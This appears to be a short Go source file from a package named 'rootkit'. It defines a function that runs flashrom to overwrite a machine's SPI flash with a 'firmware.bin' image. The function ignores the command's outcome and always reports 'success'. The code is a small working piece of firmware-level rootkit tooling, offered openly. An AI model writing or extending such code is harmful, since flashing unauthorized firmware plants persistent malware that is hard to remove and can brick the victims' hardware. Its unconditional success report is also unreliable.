package rootkit

import "os/exec"

type SPIWriteResult struct {
Status string
}

func SPIWrite() SPIWriteResult {
cmd := exec.Command("flashrom.exe", "-p", "spi", "-w", "firmware.bin")
cmd.Run()
return SPIWriteResult{Status: "success"}
}
